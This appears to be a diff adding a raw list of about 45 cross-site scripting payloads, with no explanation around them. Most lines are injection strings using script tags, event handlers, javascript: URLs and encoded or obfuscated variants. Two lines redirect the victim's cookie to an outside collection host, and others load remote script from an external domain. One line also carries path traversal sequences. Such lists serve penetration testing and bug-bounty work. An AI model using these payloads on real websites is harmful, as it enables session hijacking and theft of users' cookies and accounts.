@@ -1,0 +1,45 @@
+);><img src=x onerror=alert(1);>
+"><img src=x onerror=alert(1);>
+<script>alert(document.cookie);</script>
+<script>alert('XSS');</script>
+<img src="invalid-image" onerror="javascript:alert('XSS')">
+<div style="background-color:red;">Malicious Div</div>
+wp_lang=%20=id=x+type=image%20id=xss%20onfoc%3C!%3Eusin+alert(0)%0c
+<a href="javascript:alert('XSS')">Click Me!</a>
+<img src="invalid.jpg" onerror="alert('XSS')">
+<div id=result></div>
+<script>document.getElementById('result').innerHTML = location.hash.substring(1);</script>
+mitsec<form/><!><details/open/ontoggle=alert(document.domain)>
+<div onmouseover="alert('XSS')">Hover over me!</div>
+<a href="javascript:alert('XSS')">Click Me!</a>
+<svg/onload=alert('XSS')>
+<style>@import 'javascript:alert("XSS")';</style>
+<audio src="audiofile.wav" onerror="alert('XSS');">
+<iframe src="javascript:alert('XSS');"></iframe>
+<!--"><script>alert('XSS');</script>-->
+" onfocus="alert('XSS')" autofocus="
+"<img/src="imageurl">"@xss.com
+"><img src=x onerror=alert()>
+';)alert("xss");//
+'%3e%3cscript%3ealert(5*5)%3c%2fscript%3eejj4sbx5w4o
+"`'><script>\xE2\x80\x87javascript:alert(1)</script>
+<body%20on%0Dload=alert("1")>
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/"><img+src%3Dx+onerror%3Dalert%281%29%3B>
+'%3e%3cscript%3ealert(5*5)%3c%2fscript%3eejj4sbx5w4o
+<Img Src=//X55.is OnLoad=import(src)>
+"><Svg OnLoad=alert(1)>
+"AutoFocus/OnFocus=alert(1)//
+</Script><Svg OnLoad=alert(1)>
+'-alert(1)-'
+\'-alert(1)//
+1"`/import(src)'<Script/Src=//X55.is?1=00><Img/OnLoad='`
+Javascript:prompt(1);//
+\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e
+"><img src=X onerror="javascript:confirm(1)";>
+'\"></textarea></body><body onControl jhjhjshhs hello onpointerenter=(location=`https://bugbounty.sa.pipedream.net?c=`%2bcookie) 1>cookie
+- XSS"></textarea></body><body onControl bnsddnedss hello onpointerenter=(location=`https://bugbounty.sa.pipedream.net?t=`+cookie) > cookie
+<c/onpointerrawupdate=d=document,b=%27%60%27,d[%27loca%27%2B%27tion%27]=%27javascript%26colon;aler%27%2B%27t%27%2Bb%2Bdomain%2Bb>~tarun~Tochme
+?msg=%3Csvg%2Fonload%3Dalert%28%22XSS%22%29%20%3E, <svg/onload=alert("XSS") >
+abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e
+<a+HREF="%26%237 javascrip%26%239t: alert%261par;document .domain) *>
+”/>&_lt;_script>alert(1)&_lt;/scr_ipt>”/>
